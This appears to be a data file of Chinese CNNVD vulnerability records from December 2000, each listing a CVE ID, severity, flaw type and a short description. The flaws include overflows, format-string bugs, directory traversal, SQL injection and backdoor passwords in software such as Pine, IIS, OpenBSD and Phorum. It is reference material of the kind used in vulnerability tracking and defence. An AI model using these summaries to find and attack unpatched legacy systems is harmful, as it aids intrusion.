+Microsoft NWLink NMPI (Name Management Protocol on IPX)监听器广播风暴和网络溢出漏洞,CNNVD-200012-144,2000-12-19,2005-05-02,低危,授权问题,Microsoft NWLink中NMPI (基于IPX的名称管理器协议)监听器不能正确过滤广播地址的数据包。远程攻击者导致广播风暴和网络溢出。,CVE-2000-0980
+BSD Weak初始序列号漏洞,CNNVD-200012-185,2000-12-19,2005-10-20,低危,授权问题,FreeBSD 4.1.1及其早期版本以及可能其他基于BSD的Oses使用不充足随机数生成器产生初始TCP序列号(ISN)，远程攻击者伪造TCP连接。,CVE-2000-0916
+automatic mail checking component of Pine缓冲区溢出漏洞,CNNVD-200012-184,2000-12-19,2005-05-02,高危,授权问题,automatic mail checking component of Pine 4.21及其早期版本存在缓冲区溢出漏洞。远程攻击者可以借助超长From:头执行任意命令。,CVE-2000-0909
+Microsoft Windows媒体播放器服务拒绝漏洞,CNNVD-200012-157,2000-12-19,2005-10-12,低危,授权问题,Microsoft Windows Media Player 7版本存在漏洞。攻击者借助不能正确关闭的嵌入OCX控件导致RTF格式功能电子邮件客户端的服务拒绝，又称为“OCX附件”漏洞。,CVE-2000-0929
+BrowseGate漏洞,CNNVD-200012-098,2000-12-19,2005-05-02,低危,授权问题,BrowseGate 2.80版本存在漏洞。远程攻击者借助 HTTP请求的超长授权或者引用页MIME头导致服务拒绝和可能执行任意命令。,CVE-2000-0908
+Evolvable Shambala Server 4.5明文密码漏洞,CNNVD-200012-166,2000-12-19,2006-08-24,高危,授权问题,Shambala Server 4.5版本在明文中存储密码。本地用户获得密码并且危害服务器。,CVE-2000-0954
+Bardon Data Systems WinU 后门密码漏洞,CNNVD-200012-163,2000-12-19,2005-10-20,中危,授权问题,WinU 1.0到 5.1版本存在后门密码漏洞。远程攻击者借助该漏洞获得其管理界面和修改配置的访问权限。,CVE-2000-0988
+Compaq Easy Access Keyboard软件漏洞,CNNVD-200012-100,2000-12-19,2005-05-02,中危,授权问题,Compaq Easy Access Keyboard软件1.3版本在屏幕锁定时不能正确禁用访问到自定义按钮。攻击者提升特权或者执行没有认可的程序。,CVE-2000-0946
+IIS漏洞,CNNVD-200012-110,2000-12-19,2005-05-02,低危,授权问题,带索引服务器启用和指数特性设置的IIS 5.0版本存在错配置漏洞。远程攻击者借助Web分布式创作和版本控制（WebDAV）搜索在web根列举目录表单。,CVE-2000-0951
+HP-UX crontab读取任意文件漏洞,CNNVD-200012-153,2000-12-19,2005-05-02,低危,授权问题,HP-UX 11.00 crontab版本存在漏洞。本地用户借助- e选项通过在crontab会话期间创建与目标文件的符号链接，退出会话，以及读取crontab生成的错误消息来读取任意文件。,CVE-2000-0972
+OpenBSD漏洞,CNNVD-200012-120,2000-12-19,2005-05-02,低危,授权问题,OpenBSD 2.6及其早期版本存在漏洞。远程攻击者通过使用ARP请求淹没服务器导致服务拒绝。,CVE-2000-0914
+Kootenay Web KW Whois漏洞,CNNVD-200012-109,2000-12-19,2006-09-22,超危,授权问题,Kootenay Web KW Whois 1.0 CGI程序存在漏洞。远程攻击者借助“whois”参数的shell元字符执行任意命令。,CVE-2000-0941
+BSD libutil格式字符串漏洞,CNNVD-200012-189,2000-12-19,2005-05-02,高危,授权问题,BSD libutil程序库中的pw_error函数存在格式字符串漏洞。本地用户可以借助命令中的畸形密码例如chpass或passwd来获取根权限。,CVE-2000-0993
+Eserv漏洞,CNNVD-200012-121,2000-12-19,2005-10-20,高危,授权问题,EServ 2.92 Build 2982版本存在漏洞。远程攻击者借助超长HELO和MAIL FROM命令导致服务拒绝和可能执行任意命令。,CVE-2000-0907
+Microsoft Network Monitor (Netmon)缓冲区溢出漏洞,CNNVD-200012-133,2000-12-19,2006-04-19,高危,授权问题,Microsoft Network Monitor (Netmon)存在缓冲区溢出漏洞。远程攻击者借助CIFS浏览框中超长浏览器名称，超长SNMP团体名称，或者SMB会话中超长用户名或文件名来执行任意命令，也称为“网络监视器协议解析”漏洞。,CVE-2000-0885
+Cisco IOSHTTP服务器漏洞,CNNVD-200012-175,2000-12-19,2005-10-12,低危,授权问题,"Cisco IOS 12.0到12.1版本中的HTTP服务器存在漏洞。本地用户可以借助含有""?/""字符串的URL导致服务拒绝（崩溃和重装）。",CVE-2000-0984
+HP-UX PrinterMgmt.LP-SPOOL文件集lpspooler缓冲区溢出漏洞,CNNVD-200012-112,2000-12-19,2005-05-02,中危,授权问题,HP-UX 11.0及其早期版本的PrinterMgmt.LP-SPOOL文件集的lpspooler存在缓冲区溢出漏洞。本地用户利用该漏洞提升特权。,CVE-2000-0966
+sshd scp目录遍历漏洞,CNNVD-200012-108,2000-12-19,2006-09-05,低危,路径遍历,sshd 1.2.xx版本的scp存在目录遍历漏洞。远程恶意scp服务器借助 .. (点 点)攻击改写任意文件。,CVE-2000-0992
+HotJava浏览器访问web页面DOM漏洞,CNNVD-200012-134,2000-12-19,2005-05-02,低危,授权问题,HotJava Browser 3.0版本存在漏洞。远程攻击者通过打开javascript：命名窗口的URL来访问web页面DOM。,CVE-2000-0958
+ncurses TERMCAP Buffer缓冲区溢出漏洞,CNNVD-200012-115,2000-12-19,2006-09-15,中危,授权问题,ncurses库存在缓冲区溢出漏洞。本地用户借助超长环境信息如TERM或者TERMINFO_DIRS执行任意命令。,CVE-2000-0963
+LBNL traceroute堆溢出漏洞,CNNVD-200012-187,2000-12-19,2006-09-22,高危,授权问题,LBNL traceroute 1.4a5及其早期版本中的savestr函数存在堆溢出漏洞。本地用户可以借助-g选项执行任意命令。,CVE-2000-0949
+KDE kvt格式化字符串漏洞,CNNVD-200012-106,2000-12-19,2005-10-20,高危,授权问题,KDE 1.1.2版本的kvt存在格式化字符串漏洞。本地用户借助包含格式化字符的DISPLAY环境变量执行任意命令。,CVE-2000-0918
+QNX Voyager Webserver 多个漏洞,CNNVD-200012-097,2000-12-19,2006-09-25,低危,路径遍历,QNX 405中示范磁盘的Voyager web服务器2.01B版本存在目录遍历漏洞。远程攻击者借助 .. (点 点)攻击读取任意文件。,CVE-2000-0903
+WQuinn QuotaAdvisor漏洞,CNNVD-200012-107,2000-12-19,2005-05-02,中危,授权问题,WQuinn QuotaAdvisor 4.1版本不能正确记录储存在交替数据流中的文件大小。用户绕过定额限制。,CVE-2000-0927
+screen格式字符串漏洞,CNNVD-200012-148,2000-12-19,2005-05-02,中危,授权问题,screen 3.9.5以及之前版本存在格式字符串漏洞。本地用户借助vbell_msg初始化变量中格式字符提升根目录特权。,CVE-2000-0901
+QNX Voyager Webserver多个漏洞,CNNVD-200012-090,2000-12-19,2006-09-25,低危,授权问题,QNX 405的示范磁盘中Voyager web服务器2.01B版本储存web档案根 .photon目录的敏感web客户端信息。远程攻击者借助该漏洞获得信息。,CVE-2000-0904
+Pegasus邮件缓冲区溢出漏洞,CNNVD-200012-117,2000-12-19,2005-10-20,高危,授权问题,Pegasus Mail 3.11版本存在缓冲区溢出漏洞。远程攻击者借助超长包含二进制数据的邮件信息导致服务拒绝和可能执行任意命令。,CVE-2000-0931
+Armada总索引search.cgi CGI脚本目录遍历漏洞,CNNVD-200012-111,2000-12-19,2005-10-12,低危,路径遍历,Armada总索引的search.cgi CGI脚本存在目录遍历漏洞。远程攻击者借助“catigory”参数的 .. (点 点)攻击读取任意文件。,CVE-2000-0924
+Netscape通讯服务器POP3滥用发送垃圾邮件地址漏洞,CNNVD-200012-150,2000-12-19,2006-10-06,低危,授权问题,Netscape Messaging Server 4.15p1版本POP3服务器对于错误用户名以及相对的错误密码产生不同出错消息。远程攻击者确定系统上的有效用户并且获得滥用垃圾邮件的地址。,CVE-2000-0960
+OpenBSD su程序格式字符串漏洞,CNNVD-200012-131,2000-12-19,2005-08-22,高危,授权问题,OpenBSD su程序（和可能其他基于BSD操作系统的程序）存在格式字符串漏洞。本地攻击者借助畸形shell提升根目录特权。,CVE-2000-0996
+glibc2漏洞,CNNVD-200012-094,2000-12-19,2005-05-02,低危,授权问题,glibc2在setuid程序引出程序时不能正确清除LD_DEBUG_OUTPUT和LD_DEBUG环境变量。本地用户借助符号链接攻击改写文件。,CVE-2000-0959
+Intel InBusiness eMail Station缓冲区溢出漏洞,CNNVD-200012-190,2000-12-19,2006-08-09,低危,授权问题,Intel InBusiness eMail Station 1.04.87 POP服务存在缓冲区溢出漏洞。远程攻击者可以借助超长用户名导致服务拒绝以及可能执行命令。,CVE-2000-0989
+Oracle监听器程序漏洞,CNNVD-200012-170,2000-12-19,2005-05-02,高危,授权问题,"Oracle监听器程序7.3.4, 8.0.6,和8.1.6版本中的默认装置存在漏洞。攻击者可以借助SET TRC_FILE或SET LOG_FILE命令导致登录信息被附加到任意文件和执行命令。",CVE-2000-0818
+IIS漏洞,CNNVD-200012-113,2000-12-19,2005-10-12,中危,授权问题,IIS 5.0版本存在漏洞。远程攻击者借助到名字附加有操作系统命令可执行文件的畸形请求执行任意命令，也称为“Web服务器文件请求解析”漏洞。,CVE-2000-0886
+HiNet LP5100 IP-phone网络管理服务缓冲区溢出漏洞,CNNVD-200012-146,2000-12-19,2005-05-02,超危,授权问题,HiNet LP5100 IP-phone中网络管理服务存在缓冲区溢出漏洞。远程攻击者借助超长GET请求导致服务拒绝和可能执行任意命令。,CVE-2000-0964
+OpenBSD fstat存在格式字符串漏洞,CNNVD-200012-137,2000-12-19,2005-08-22,高危,授权问题,OpenBSD fstat程序（和可能其他基于BSD操作系统的程序）存在格式字符串漏洞。本地用户借助PWD环境变量提升根目录特权。,CVE-2000-0994
+Half Life专用服务器缓冲区溢出漏洞,CNNVD-200012-183,2000-12-19,2005-05-02,超危,授权问题,Half Life专用服务器build 3104之前版本存在缓冲区溢出漏洞。远程攻击者可以借助超长rcon命令执行任意命令。,CVE-2000-0968
+HP-UX 安全漏洞,CNNVD-200012-192,2000-12-20,2022-08-19,高危,其他,HP-UX是惠普的一个操作系统。 HP-UX cstm 存在安全漏洞。本地用户可以获取根权限。,CVE-1999-0307
+Technote 'filename'变量导致文件泄露漏洞,CNNVD-200102-050,2000-12-27,2005-10-20,中危,授权问题,"Technote是韩国的Technote公司( http://www.technote.co.kr )开发的BBS系统。 此BBS实现上存在一个输入验证漏洞，远程攻击者可能利用此漏洞读取服务器上的任意文件。 其中一个脚本main.cgi接受一个名为""filename""的参数。该变量的值由远程提供，并被作为文件名传递给open( )函数，但它并未检查其中的""../""串。结果，恶意的远程用户可以察看系统中Web服务器进程能够读取的任何文件。这可能泄漏敏感信息并有助于进一步攻击受害主机。",CVE-2001-0075
+Oracle IAS PL/SQL注入漏洞,CNNVD-200012-206,2000-12-31,2005-10-20,低危,授权问题,Oracle Internet Application Server (IAS) 3.0.7及其早期版本中的（1）端口监听及（2）modplsql的默认配置存在漏洞。远程攻击者可以借助Database Access Descriptor (DAD)文件中的HTTP请求查看特权数据库信息。,CVE-2000-1235
+Xitami敏感信息受到威胁,CNNVD-200012-210,2000-12-31,2005-10-20,低危,授权问题,Xitami 2.5b版本通过cgi-bin目录中的默认来安装testcgi.exe程序，远程攻击者可以通过访问程序获取关于web服务器的敏感配置信息。,CVE-2000-1225
+Oracle IAS PL/SQL注入漏洞,CNNVD-200012-211,2000-12-31,2005-10-20,高危,SQL注入,Oracle Internet Application Server (IAS) 3.0.7及其早期版本中的mod_sql存在SQL注入漏洞。远程攻击者可以借助URL中的查询字符串执行任意SQL命令。,CVE-2000-1236
+Dansie Shopping Cart漏洞,CNNVD-200012-195,2000-12-31,2007-08-01,低危,授权问题,Dansie Shopping Cart 3.04及其可能早期版本存在泄漏隐私漏洞。该漏洞导致发送敏感信息如用户证书到被产品开发控制的电子邮件地址中。,CVE-2000-1243
+Phorum目录遍历漏洞,CNNVD-200012-197,2000-12-31,2005-10-20,低危,路径遍历,"Phorum 3.0.7版本存在目录遍历漏洞。远程Phorum管理员可以借助Master Settings管理函数中默认.langfile名称字段的""..""（点 点）序列读取任意文件，该漏洞导致文件被显示在admin.php3中。",CVE-2000-1229
+Microsoft Windows NT 4.0 / 2000 安全漏洞,CNNVD-200012-200,2000-12-31,2005-10-20,中危,其他,Windows NT 4.0和Windows 2000主机存在漏洞。远程攻击者可以通过发送多种SMB SMBnegprots请求而不是读取发送回的响应导致服务拒绝（无法连接），,CVE-2000-1227
+IBM Tivoli Lightweight Client Framework信息泄露漏洞,CNNVD-200012-208,2000-12-31,2006-05-01,超危,授权问题,IBM Tivoli Management Framework 3.7.1版本中Tivoli Lightweight Client Framework (LCF)的HTTP界面在安装的时候设置http_disable为零，远程验证用户可以借助记录文件的未明操作绕过Tivoli Endpoint Configuration数据文件上的文件权限。,CVE-2000-1239
+Microsoft Exchange Server 安全漏洞,CNNVD-200012-196,2000-12-31,2021-04-12,高危,其他,Microsoft Exchange Server是美国微软（Microsoft）公司的一套电子邮件服务程序。它提供邮件存取、储存、转发，语音邮件，邮件过滤筛选等功能。 Exchange Server中的Computer Associates InoculateIT Agent如果SMTP头丢失在 From 域中则不能识别电子邮件病毒附件，远程攻击者可以绕过病毒保护。,CVE-2000-1244
+SIPS Haakon Nilsen未明安全漏洞,CNNVD-200012-193,2000-12-31,2011-07-14,超危,授权问题,集成出版系统(SIPS) 0.2.4之前版本的Haakon Nilsen simple中存在未明漏洞，该漏洞可引起未知影响和攻击向量。,CVE-2000-1241
+American Power Conversion (APC) PowerChute漏洞,CNNVD-200012-202,2000-12-31,2007-05-22,超危,授权问题,American Power Conversion (APC) PowerChute中的HTTP服务使用默认用户名和密码，远程攻击者可以获取系统访问权限。,CVE-2000-1242
+BEA Systems WebLogic访问控制绕过漏洞,CNNVD-200012-212,2000-12-31,2006-05-01,高危,授权问题,BEA Systems WebLogic Express和WebLogic Server 5.1 SP1-SP6版本存在漏洞。远程攻击者可以借助具有多个在受限页面之前的/(正斜杠)字符串的URL绕过受限JSP或servlet的访问控制。,CVE-2000-1238
+Phorum SQL注入漏洞,CNNVD-200012-207,2000-12-31,2005-10-20,低危,SQL注入,Phorum 3.0.7版本中的read.php3及其其他脚本存在SQL注入漏洞。远程攻击者可以借助sSQL参数执行任意SQL问题。,CVE-2000-1233
+Snort漏洞,CNNVD-200012-198,2000-12-31,2005-10-20,低危,授权问题,Snort 1.6版本存在漏洞。当运行在直接ASCII数据包登录模式或具有直接译码ASCII数据包选定登录的IDS模式时，远程攻击者可以通过发送Snort不知道的非IP协议导致服务拒绝（崩溃），该漏洞被nmap协议扫描所验证。,CVE-2000-1226
+Phorum查询字符串漏洞,CNNVD-200012-201,2000-12-31,2005-10-20,低危,授权问题,Phorum 3.0.7版本中的code.php3存在漏洞。远程攻击者可以借助查询字符串读取phorum目录中的任意文件。,CVE-2000-1231
+FTGate POP3服务器漏洞,CNNVD-200012-194,2000-12-31,2005-10-20,低危,授权问题,FTGate中的POP3服务器在收到无效USER请求之后返回-ERR代码，远程攻击者可以更容易确定有效用户名以及进行强力密码猜测。,CVE-2000-1237
+Phorum upgrade.php3 漏洞,CNNVD-200012-209,2000-12-31,2005-10-20,低危,授权问题,Phorum 3.0.7版本中的upgrade.php3存在漏洞。远程攻击者可以借助未知方法修改某些Phorum数据表格。,CVE-2000-1232
+AnyPortal(php)敏感信息泄露漏洞,CNNVD-200012-203,2000-12-31,2006-05-01,低危,授权问题,AnyPortal(php) 22 APR 00之前版本中的siteman.php3存在未明漏洞。远程攻击者可以借助未知攻击向量获取敏感信息，该漏洞揭示了绝对路径。,CVE-2000-1240
